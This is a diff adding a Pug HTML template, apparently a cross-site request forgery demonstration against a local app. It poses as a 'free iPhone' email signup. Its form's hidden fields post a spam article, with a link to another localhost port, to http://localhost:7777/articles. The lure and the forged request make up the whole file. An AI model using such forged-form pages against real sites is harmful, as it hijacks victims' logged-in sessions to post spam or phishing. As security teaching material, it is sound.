@@ -1,0 +1,41 @@
+doctype 5
+html(lang="en")
+  head
+    title Get A Free iPhone
+
+    meta(charset="UTF-8")
+    meta(name="viewport", content="initial-scale=1.0, width=device-width")
+
+    block styles
+      style.
+        :root {
+          font-size: 24px;
+        }
+
+        fieldset {
+          max-width: 400px;
+        }
+
+        input[type="text"],
+        input[type="submit"] {
+          font-size: inherit;
+        }
+
+  body
+    main
+
+      center
+
+        form(method="post" action="http://localhost:7777/articles")
+          input(type="hidden" name="title" value="MORE FREE iPHONES")
+          input(type="hidden" name="body" value="**[CLICK HERE TO GET YOU FREE iPHONE !!](http://localhost:7666)**")
+
+          fieldset
+            legend Enter you email address:
+
+            input(type="text" id="email" name="email")
+
+            br
+            br
+
+            input(type="submit" value="GET YOUR FREE iPHONE NOW")
